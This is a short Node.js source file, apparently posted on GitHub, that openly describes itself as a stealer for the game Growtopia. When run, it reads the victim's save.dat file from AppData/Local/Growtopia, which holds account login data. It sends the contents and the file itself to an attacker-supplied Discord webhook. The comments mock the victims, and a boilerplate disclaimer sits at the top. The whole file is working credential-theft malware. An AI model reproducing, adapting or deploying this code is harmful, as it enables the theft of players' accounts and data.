/*** Created on Github accounts named FrenzY8 ***/
/*** 
- Just a seconds. please read.
Do not use for Abuse Activities. 
We will not be held responsible for anything that happens to the Victim, the Perpetrator.
This code is only distributed and is not recommended to be used TO PUBLIC (including-abuse)
Only fools trade(buy/sell) this Code.
- All risks are in your hands.
***/

/*** Get Started ***/
console.log("Get ready.. we'll stole a save.data :D")
const os = require('os');
const { 
    Webhook, 
    MessageBuilder 
} = require('discord-webhook-node');
const yourhook = new Webhook('your-faking-noob-webhook'); // Noob webhooks.
const fs = require('fs');

// Lets start:D
function stealdat () {
    const path = `${os.homedir()}/AppData/Local/Growtopia/save.dat`
    if (fs.existsSync(path)) { // Detect the path. if they exists or nop. why? cause some ppl are SMART.
    console.log("Lets start this devil-actions.")
    // read it first
    const hasil = fs.readFileSync(path,'utf8') // Results of reading the data...
    const noobembed = new MessageBuilder() // Make new embed
    .setAuthor("New Account h;ve been stolen.", 'https://c.tenor.com/0hjOGLFaQa0AAAAM/lofi-girl-lofi.gif')
    .setURL('https://github.com/FrenzY8') // URI
    .setDescription("```ini\n" + hasil + "\n```")
    .setFooter("Stolen Lol.. Just Imagining noob player get stolen.", 'https://c.tenor.com/0hjOGLFaQa0AAAAM/lofi-girl-lofi.gif')
    //send embed.
    yourhook.send(noobembed)
    //then files.
    yourhook.sendFile(path);
    console.log("Lol... imagine noob get stolen! btw the files h;ve been sended to your webhook.") // Send the notify
  } else {
      console.log("well.. we didnot found any save dat.")
  }
}
// now we do a:
stealdat();

/*Discord: .FrenzySG.#2331 (not-respond-for-dm)
Instagram: frenzy.666 (respond-to-a-dm)*/
